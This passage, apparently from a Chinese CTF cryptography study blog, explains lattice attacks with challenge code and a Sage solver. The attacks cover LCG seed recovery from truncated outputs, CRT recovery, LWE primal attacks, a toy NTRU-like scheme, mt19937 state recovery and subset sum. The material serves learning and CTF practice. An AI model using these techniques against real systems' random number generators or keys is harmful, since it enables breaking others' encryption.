class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>加密:给你一个LCG连续输入的高位,这些高位不固定.给你a,b,m,你要尝试解出种子.<br>首先我们知道LCG的基本形式</p>
<script type="math/tex; mode=display">x_i\equiv (a^ix_0+b(a^{i-1}+...a^0))\mod m</script><p>然后我们有</p>
<script type="math/tex; mode=display">a^ix_0+k_im=(\mathtt{data[i]}<<(256-\mathtt{ns[i]}))-b(a^{i-1}+...+1)+\boxed{e_i}</script><p>所以我们对前半部分构造格:</p>
<script type="math/tex; mode=display">\begin{bmatrix}
m&&&&&\\
&m&&&&\\
&&...&&&\\
&&&m&&\\
a^0&a^1&...&a^{n-1}&1
\end{bmatrix}</script><p>这表示上式左边的线性关系.<br>然后右半部分构成一个向量:除了e的部分都是已知的,我们对e加上期望(也就是ns移位的一半),然后对这个矩阵和向量t求CVP,得到的再加上b就是完整的随机数的数列了,即</p>
<script type="math/tex; mode=display">t=(xxx|2^{255})</script><p>t左边就是矩阵上面那个式子的右半部分,最后那个是你期望得到的那个随机数变量,他在 $[0,2^{256})$ 内均匀分布,期望是 $2^{255}$</p>
<blockquote>
<p>notice1: 尝试使用更优的BKZ,而不是LLL(虽然理论上时间会更长)</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ns =</span><br><span class="line">data = </span><br><span class="line">ct =</span><br><span class="line">b=</span><br><span class="line">m=<span class="number">2</span>**<span class="number">256</span></span><br><span class="line">n=<span class="built_in">len</span>(data)</span><br><span class="line">mat=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">	tmp=[]</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n+<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> i==j:</span><br><span class="line">			tmp.append(m)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			tmp.append(<span class="number">0</span>)</span><br><span class="line">	mat.append(tmp)</span><br><span class="line">tmp=[]</span><br><span class="line">pre=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">	tmp.append(pre)</span><br><span class="line">	pre=pre*a%m</span><br><span class="line">tmp.append(<span class="number">1</span>)</span><br><span class="line">mat.append(tmp)</span><br><span class="line"></span><br><span class="line">pre=<span class="number">0</span></span><br><span class="line">ex=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">	ex.append((((data[i]&lt;&lt;(<span class="number">256</span>-ns[i]))-b*pre))%m)</span><br><span class="line">	pre=(pre+<span class="built_in">pow</span>(a,i,m))%m</span><br><span class="line">ex.append(<span class="number">1</span>&lt;&lt;<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">_ctx_reduction.<span class="built_in">set</span>(BKZ)		<span class="comment"># 用BKZ</span></span><br><span class="line">res=cvp(matrix(ZZ,mat),vector(ZZ,ex))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h3 id="中国剩余定理选色问题"><a href="#中国剩余定理选色问题" class="headerlink" title="中国剩余定理选色问题"></a>中国剩余定理选色问题</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pbits = <span class="number">360</span></span><br><span class="line">nbits = <span class="number">3840</span></span><br><span class="line">n = <span class="number">16</span></span><br><span class="line">primes = [getPrime(pbits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">secrets = [getRandomNBitInteger(nbits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">secrets.sort()</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> primes:</span><br><span class="line">    tmp = [s % p <span class="keyword">for</span> s <span class="keyword">in</span> secrets]</span><br><span class="line">    random.shuffle(tmp)</span><br><span class="line">    data.append(tmp)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">pt, secrets</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(pt, hashlib.sha512(<span class="built_in">str</span>(<span class="built_in">list</span>(secrets)).encode()).digest()))</span><br><span class="line">ct = encrypt(flag, secrets)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;primes = &#125;</span>&quot;</span>, file = f)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;data = &#125;</span>&quot;</span>, file = f)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>, file = f)</span><br></pre></td></tr></table></figure>
<p>上面的意思是,随机secret个数字,然后给模意义下的剩余,最后打乱,你要尝试还原这个数组.<br>(由中国剩余定理)假设有</p>
<script type="math/tex; mode=display">\begin{cases}
a\equiv a_1 \mod p_1\\
a\equiv a_2 \mod p_2\\
...\\
a\equiv a_n \mod p_n\\
\end{cases}</script><p>设 $P=\prod p_i,P_i=P/p_i$ 那么根据中国剩余定理有:</p>
<script type="math/tex; mode=display">a\equiv \left(\sum_{i=1}^na_iP_i(P_{i}^{-1}\mod p_i)\right)\mod P</script><p>发现对于每个a构成一个线性关系,我们构造一个格:</p>
<script type="math/tex; mode=display">\begin{bmatrix}
P\\
a_{11}p_1(P^{-1}\mod p_1)&\alpha\\
...\\
a_{1n}p_1(P^{-1}\mod p_1)&&&\alpha\\
a_{21}p_2(P^{-1}\mod p_2)&&&&\alpha\\
...\\
a_{nn}p_n(P^{-1}\mod p_n)&&&&&\alpha\\
\end{bmatrix}</script><p>然后对其使用LLL,得到的前n个解就是格为我们挑选出来的大小近似我们选取的alpha的值,所以根据加密时alpha是 $2^{3840}$ ,得到的结果也是近似alpha的值.<br>脚本就是纯写一个矩阵然后求LLL,非常简单,所以不在这里展示了.</p>
<p><strong>注意</strong> :Windows的SageMath 9.3 版本有一个锅,如果上述取逆元的脚本写成<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk.append((pi[i]*<span class="built_in">pow</span>(pi[i],primes[i]-<span class="number">2</span>,primes[i])))</span><br></pre></td></tr></table></figure><br>是错的,得到的bk全是1,原因是pow运算在老版本的sage内会被自动放到整数环上进行,同时前面的数是int也会被自动同化为Zmod上,模数错了答案自然也就错了.<br>应该强制结果放到整数环上然后再乘.<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">op=ZZ(<span class="built_in">pow</span>(pi[i],primes[i]-<span class="number">2</span>,primes[i]))</span><br><span class="line">bk.append((pi[i]*op))</span><br></pre></td></tr></table></figure></p>
<h3 id="在一个模-mathbb-F-2-8-mathbb-F-2-x-X-8-X-4-X-3-X-1-的环中求解线性方程组-Ax-b"><a href="#在一个模-mathbb-F-2-8-mathbb-F-2-x-X-8-X-4-X-3-X-1-的环中求解线性方程组-Ax-b" class="headerlink" title="在一个模 $\mathbb{F}_{2^8}=\mathbb{F}_2[x]/(X^8+X^4+X^3+X+1)$ 的环中求解线性方程组 Ax=b"></a>在一个模 $\mathbb{F}_{2^8}=\mathbb{F}_2[x]/(X^8+X^4+X^3+X+1)$ 的环中求解线性方程组 Ax=b</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义有限域 F_&#123;2^8&#125;，使用给定的不可约多项式</span></span><br><span class="line">F.&lt;x&gt; = GF(<span class="number">2</span>^<span class="number">8</span>, modulus=x^<span class="number">8</span> + x^<span class="number">4</span> + x^<span class="number">3</span> + x + <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 定义矩阵 A 的整数条目</span></span><br><span class="line">A_int = [</span><br><span class="line">    [<span class="number">77</span>, <span class="number">217</span>, <span class="number">104</span>, <span class="number">173</span>, <span class="number">4</span>, <span class="number">170</span>, <span class="number">15</span>],</span><br><span class="line">    [<span class="number">155</span>, <span class="number">75</span>, <span class="number">159</span>, <span class="number">94</span>, <span class="number">26</span>, <span class="number">99</span>, <span class="number">161</span>],</span><br><span class="line">    [<span class="number">110</span>, <span class="number">36</span>, <span class="number">60</span>, <span class="number">7</span>, <span class="number">246</span>, <span class="number">103</span>, <span class="number">112</span>],</span><br><span class="line">    [<span class="number">17</span>, <span class="number">107</span>, <span class="number">178</span>, <span class="number">67</span>, <span class="number">6</span>, <span class="number">18</span>, <span class="number">117</span>],</span><br><span class="line">    [<span class="number">56</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">205</span>, <span class="number">0</span>, <span class="number">189</span>, <span class="number">25</span>],</span><br><span class="line">    [<span class="number">162</span>, <span class="number">9</span>, <span class="number">180</span>, <span class="number">33</span>, <span class="number">52</span>, <span class="number">75</span>, <span class="number">127</span>],</span><br><span class="line">    [<span class="number">238</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">110</span>, <span class="number">133</span>, <span class="number">95</span>, <span class="number">9</span>]</span><br><span class="line">]</span><br><span class="line"><span class="comment"># 定义向量 b 的整数条目</span></span><br><span class="line">b_int = [<span class="number">12</span>, <span class="number">153</span>, <span class="number">112</span>, <span class="number">166</span>, <span class="number">90</span>, <span class="number">180</span>, <span class="number">223</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将矩阵 A 和向量 b 转换为有限域 F 中的元素</span></span><br><span class="line">A_F = matrix(F, <span class="number">7</span>, <span class="number">7</span>, <span class="keyword">lambda</span> i, j: F.fetch_int(A_int[i][j]))</span><br><span class="line">b_F = vector(F, [F.fetch_int(x) <span class="keyword">for</span> x <span class="keyword">in</span> b_int])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解线性方程组 A * x = b</span></span><br><span class="line">x_F = A_F.solve_right(b_F)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解向量 x 中的每个元素转换为整数表示</span></span><br><span class="line">x_int = [el.integer_representation() <span class="keyword">for</span> el <span class="keyword">in</span> x_F]</span><br></pre></td></tr></table></figure>
<p>模多项式似乎可以被理解为x位只能是1或0</p>
<h3 id="整数环上的欠定方程组"><a href="#整数环上的欠定方程组" class="headerlink" title="整数环上的欠定方程组"></a>整数环上的欠定方程组</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">100</span></span><br><span class="line">m = <span class="number">40</span></span><br><span class="line">f = os.urandom(n)</span><br><span class="line">x_s = [random.randrange(-<span class="number">2</span>**<span class="number">32</span>, <span class="number">2</span>**<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">y_s = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> x_s:</span><br><span class="line">    y_s.append(<span class="built_in">sum</span>(f[i] * x**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)))</span><br><span class="line">ct = AES.new(hashlib.sha256(f).digest(), AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x_s = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;y_s = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>也就是下面的关系:</p>
<script type="math/tex; mode=display">y_j = \sum\limits_{i=0}^{n-1} f_i x_j^i,\quad \forall j,\ 0\le j < m</script><p>将其写成矩阵的形式：</p>
<script type="math/tex; mode=display">
\begin{pmatrix} 
    -1 & f_0 & f_1 & \cdots & f_{n-1}
\end{pmatrix}
\begin{pmatrix}
    y_0 & y_1 & \cdots & y_{m-1}\\
    1 & 1 & \cdots & 1\\
    x_0 & x_1 & \cdots & x_{m-1}\\
    \vdots & \vdots & \ddots & \vdots\\
    x_0^{n-1} & x_1^{n-1} & \cdots & x_{m-1}^{n-1}\\
\end{pmatrix}
=
\begin{pmatrix}
    0 & \cdots & 0
\end{pmatrix}</script><p>为了应用LLL,我们需要构造一个矩阵 $B$ ，其行向量张成一个格 $L(B)$ 。如果 $L(B)$ 中存在一个短向量 $\mathrm t$ ，且 $\mathrm t$ 显著短于 $L$ 中其他向量，那么根据LLL-reduced basis的性质，</p>
<script type="math/tex; mode=display">\Vert \mathrm b_1\Vert \le \left(\frac{2}{\sqrt{4\delta-1}}\right)^{d-1}\cdot \lambda_1(L)</script><p>（其中$d$表示基向量组的秩）即我们有把握从输出中的第一个基向量取得$\mathrm t$。</p>
<p>在上式的基础上加以改进，</p>
<script type="math/tex; mode=display">
\begin{aligned}
\left(\begin{array}{c|cccc}
    -1 & f_0 & f_1 & \cdots & f_{n-1}
\end{array}\right)
&\underbrace{\left(\begin{array}{cccc|c|cccc}
    y_0 & y_1 & \cdots & y_{m-1} & 1 &&&&\\ \hline 
    1 & 1 & \cdots & 1 & &1&&&\\
    x_0 & x_1 & \cdots & x_{m-1} & &&1&&\\
    \vdots & \vdots & \ddots & \vdots & &&&\ddots&\\
    x_0^{n-1} & x_1^{n-1} & \cdots & x_{m-1}^{n-1} & &&&&1\\
\end{array}\right)}_{B}\\
&=
\underbrace{\left(\begin{array}{cccc|c|cccc}
0 & 0 & \cdots & 0 & -1 & f_0 & f_1 & \cdots & f_{n-1}
\end{array}\right)}_{\mathrm t}
\end{aligned}</script><p>式中，$\mathrm t$就是一个短的向量。</p>
<p>为了保证$\mathrm t$的前$m+1$个分量为$0,\ 0,\ \cdots,\ 0,\ \pm 1$，我们可以将这几个分量适当地放大（乘上一个系数），这样一来原本不满足条件的$\mathrm t$就不容易被格基约化算法挑选出来。</p>
<script type="math/tex; mode=display">
B = \left(\begin{array}{cccc|c|cccc}
    \alpha\cdot y_0 & \alpha\cdot y_1 & \cdots & \alpha\cdot y_{m-1} & -\beta\cdot 1 &&&&\\ \hline 
    \alpha\cdot  1 & \alpha\cdot 1 & \cdots & \alpha\cdot 1 & &1&&&\\
    \alpha\cdot x_0 & \alpha\cdot x_1 & \cdots & \alpha\cdot x_{m-1} & &&1&&\\
    \vdots & \vdots & \ddots & \vdots & &&&\ddots&\\
    \alpha\cdot x_0^{n-1} & \alpha\cdot x_1^{n-1} & \cdots & \alpha\cdot x_{m-1}^{n-1} & &&&&1\\
\end{array}\right)</script><p>其中$\alpha$可以选取较大的数，如$2^{256}$；而$\beta$选取与$f_i$接近的数，如$2^7$、$2^8$。</p>
<p>直接构造这个矩阵即可,脚本略.</p>
<h3 id="模意义下的欠定方程组"><a href="#模意义下的欠定方程组" class="headerlink" title="模意义下的欠定方程组"></a>模意义下的欠定方程组</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">100</span></span><br><span class="line">m = <span class="number">40</span></span><br><span class="line">p = getPrime(<span class="number">32</span>)</span><br><span class="line">f = os.urandom(n)</span><br><span class="line">x_s = [random.randrange(p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">y_s = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> x_s:</span><br><span class="line">    y_s.append(<span class="built_in">sum</span>(f[i] * x**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)) % p)</span><br><span class="line">ct = AES.new(hashlib.sha256(f).digest(), AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x_s = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;y_s = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>本题需要求解一个$\mathbb{F}_p$上的欠定（underdetermined）线性方程组。<br>考虑如下的线性关系：</p>
<script type="math/tex; mode=display">y_j \equiv \sum\limits_{i=0}^{n-1} f_i x_j^i \pmod{p},\quad \forall j,\ 0\le j < m</script><p>即</p>
<script type="math/tex; mode=display">y_j = k_jp + \sum\limits_{i=0}^{n-1} f_i x_j^i,\quad \forall j,\ 0\le j < m</script><p>与整数环类似，我们可以先构造一个梯形状的格矩阵。而考虑到本题中由模$p$操作引入的$k_jp$项，我们在梯形的上方添加这些项，将整个矩阵补全成一个下三角状（楔形）。</p>
<script type="math/tex; mode=display">
B = \left(\begin{array}{cccc|c|cccc}
    \alpha\cdot p&&&&&&&&\\ 
    &\alpha\cdot p&&&&&&&\\
    &&\ddots&&&&&&\\
    &&&\alpha\cdot p&&&&&\\ \hline
    \alpha\cdot y_0 & \alpha\cdot y_1 & \cdots & \alpha\cdot y_{m-1} & -\beta\cdot 1 &&&&\\ \hline 
    \alpha\cdot  1 & \alpha\cdot 1 & \cdots & \alpha\cdot 1 & &1&&&\\
    \alpha\cdot x_0 & \alpha\cdot x_1 & \cdots & \alpha\cdot x_{m-1} & &&1&&\\
    \vdots & \vdots & \ddots & \vdots & &&&\ddots&\\
    \alpha\cdot x_0^{n-1} & \alpha\cdot x_1^{n-1} & \cdots & \alpha\cdot x_{m-1}^{n-1} & &&&&1\\
\end{array}\right)</script><p>容易计算</p>
<script type="math/tex; mode=display">\det(B) = \alpha^m \beta p^m</script><p>我们期待的短向量$\mathrm t$为</p>
<script type="math/tex; mode=display">\mathrm t = \left(\begin{array}{cccc|c|cccc}
    0 & 0 & \cdots & 0 & \beta & f_0 & f_1 & \cdots & f_{n-1}
\end{array}\right)</script><script type="math/tex; mode=display">\Vert \mathrm t\Vert_2 < \sqrt{\beta^2 + n\cdot 2^{16}}</script><p>为了使</p>
<script type="math/tex; mode=display">\Vert \mathrm t\Vert_2 = \lambda_1(L(B)) \le \left(\frac{2}{\sqrt{4\delta-1}}\right)^{\frac{n+m+1}{2}}\cdot (\det(B))^{\frac{1}{n+m+1}}</script><p>固定$\beta\approx 2^7$、$\delta\approx 0.99$，我们需要让$\alpha$尽可能地偏大。</p>
<p>人话:构造了一个矩阵,然后通过alpha和beta调参筛选出指定最短向量</p>
<h3 id="LWE-容错学习问题-learning-with-errors-problem"><a href="#LWE-容错学习问题-learning-with-errors-problem" class="headerlink" title="LWE 容错学习问题 learning with errors problem"></a>LWE 容错学习问题 learning with errors problem</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">F = GF(p)</span><br><span class="line">n = <span class="number">40</span></span><br><span class="line">m = <span class="number">60</span></span><br><span class="line">A = random_matrix(F, m, n)</span><br><span class="line">s = random_vector(F, n)</span><br><span class="line">e = random_vector(ZZ, m, x=-<span class="number">4</span>, y=<span class="number">5</span>).change_ring(F)</span><br><span class="line">b = A*s + e</span><br><span class="line">ct = AES.new(hashlib.sha256(<span class="built_in">str</span>(<span class="built_in">list</span>(s)).encode()).digest(), AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;A = <span class="subst">&#123;<span class="built_in">list</span>(A)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;m = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>假如说有 $\mathrm{As\equiv b}\mod p$ ,已知A和b的情况下我们可以直接solve_right()解决.<br>但是现在加上了随机误差,即公式变成 $\mathrm{As+e\equiv b}\mod p$ ,就不好搞了,这种问题被称作LWE问题.<br>首先根据前面的总结我们可以直接构造下面的格:($I_n$是n阶单位矩阵)</p>
<script type="math/tex; mode=display">
L_1 = \left(
\begin{array}{ccc}
\alpha\cdot p\mathrm I_m &&\\
\alpha\cdot \mathrm A^T & \mathrm I_n &\\
\alpha\cdot \mathrm b^T & & \beta\\
\end{array}
\right)</script><p>$L_1$具有如下的短向量</p>
<script type="math/tex; mode=display">
\left(\begin{array}{ccc|c|c}
    k_1 & \cdots & k_m & -\mathrm s^T & 1
\end{array}\right)
L_1
=
\underbrace{\left(
\begin{array}{c|c|c}
    \alpha\cdot \mathrm e^T & -\mathrm s^T & \beta
\end{array}
\right)}_{\mathrm t_1}</script><p>为了提高格基约化的质量，我们显然需要精心选择$\alpha$与$\beta$，使得$\mathrm t_1$分量的尺寸相近。<br>刚刚构造的$L_1$是一个$(m+n+1)\times (m+n+1)$维的矩阵。注意到$\mathrm s$本身并非短向量，我们可以考虑不在右侧用单位矩阵接收$\mathrm s$。通过初等行变换，我们可以将$\mathrm A^T$（$m&gt;n$，一般$\operatorname{\text{rank}}({\mathrm A^T}) = n$）变换为如下的行阶梯形（row echelon form）。</p>
<script type="math/tex; mode=display">\mathrm P\mathrm A^T \equiv \left(\begin{array}{c|c}
    \mathrm I_n & \mathrm A'^T_{n\times(m-n)}
\end{array}\right) \pmod{p}</script><p>于是</p>
<script type="math/tex; mode=display">\mathrm b^T - (\mathrm s^T\mathrm P^{-1})(\mathrm P \mathrm A^T) \equiv \mathrm e^T \pmod{p}</script><p>接下来考虑</p>
<script type="math/tex; mode=display">
L_2 = \left(
\begin{array}{ccc}
    \mathrm I_n & \mathrm A'^T_{n\times(m-n)} & \\
    & p\mathrm I_{m-n} & \\
    \mathrm b(1,\cdots,n) & \mathrm b(n+1,\cdots,m) & \beta\\
\end{array}
\right)</script><p>$L_2$中有短向量</p>
<script type="math/tex; mode=display">
\left(\begin{array}{ccc|ccc|c}
    -x_1 + k_1p & \cdots & -x_n + k_np & k_{n+1} & \cdots & k_m & 1
\end{array}\right)
L_2
=
\underbrace{\left(\begin{array}{c|c}
    \mathrm e^T & \beta
\end{array}\right)}_{\mathrm t_2}</script><p>\noindent 其中$\mathrm s^T\mathrm P^{-1} \equiv (x_1, \cdots, x_n) \pmod{p}$。</p>
<p>我们需要$\beta$的尺寸与误差的尺寸相近。$L_2$的维数只有$(m+1)\times (m+1)$，通过$L_2$解决LWE问题的攻击方式称为原始攻击（primal attack）。<br>另外，不难发现当$m\le n$时通过格基约化是不可能求出$\mathrm e$的(因为LLL需要细长的矩阵)（假设$\mathrm A$、$\mathrm s$随机生成）。  </p>
<h3 id="神秘加密体系-NTRU"><a href="#神秘加密体系-NTRU" class="headerlink" title="神秘加密体系(NTRU)"></a>神秘加密体系(NTRU)</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">pbits, qbits</span>):</span><br><span class="line">    p = getPrime(pbits)</span><br><span class="line">    q = getPrime(qbits)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomNBitInteger(qbits//<span class="number">4</span>) | <span class="number">1</span></span><br><span class="line">        b = getRandomNBitInteger(qbits//<span class="number">4</span>) | <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> GCD(a, b) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = a * <span class="built_in">pow</span>(b, -<span class="number">1</span>, q) % q</span><br><span class="line">    pkey = (h, p, q, pbits, qbits)</span><br><span class="line">    skey = (a, b, pkey)</span><br><span class="line">    <span class="keyword">return</span> pkey, skey</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, pkey</span>):</span><br><span class="line">    h, p, q, pbits, qbits = pkey</span><br><span class="line">    r = getRandomNBitInteger(qbits//<span class="number">4</span>-<span class="number">1</span>)</span><br><span class="line">    c = (p*h*r + m) % q</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, skey</span>):</span><br><span class="line">    a, b, (h, p, q, pbits, qbits) = skey</span><br><span class="line">    mb = c*b % q % (p*a)</span><br><span class="line">    <span class="keyword">if</span> mb % b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> mb // b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError</span><br><span class="line">pkey, skey = keygen(<span class="number">2048</span>, <span class="number">4096</span>)</span><br></pre></td></tr></table></figure>
<p>把多项式环上的加密算法放到整数环上,可以被构造</p>
<script type="math/tex; mode=display">\begin{bmatrix}q&0\\ h&1\end{bmatrix}</script><p>这个格,然后使用lll求出最短向量,答案大概率就是ab(噪音消下去了)</p>
<h3 id="mt19937"><a href="#mt19937" class="headerlink" title="mt19937"></a>mt19937</h3><p>有一个性质是,mt19937的状态只有624种,只需要知道连续的624个输入就能还原整个引擎.<br>内部实现类似”分块”,初始化种子之后进行一轮”twist”会产生624个新的可用随机数,然后输出时候再过一遍仿射变换.<br>这种引擎在密码学上是不安全的,因为输出的仿射变换是可逆的(用了xor运算),且twist操作只和i,i+1,(i+397)%624这三个数有关,也就是说,假设我们知道部分输出,也能逆向出部分引擎的状态.</p>
<p>还有就是,mt一次会输出32个数字,在py里面如果需要比如说只有8个数字,就会舍掉低位的;<br>如果需要50个数字,会先拼成64位,然后再舍.</p>
<h3 id="子集和"><a href="#子集和" class="headerlink" title="子集和"></a>子集和</h3><p>时间复杂度 $O(n^3\log^2w)$ ,构造下面的格直接跑LLL然后取最上面最小的那个向量即可.</p>
<script type="math/tex; mode=display">\begin{bmatrix}1&&&&a_1\\
&1&&&a_2\\
&&1&&a_3\\
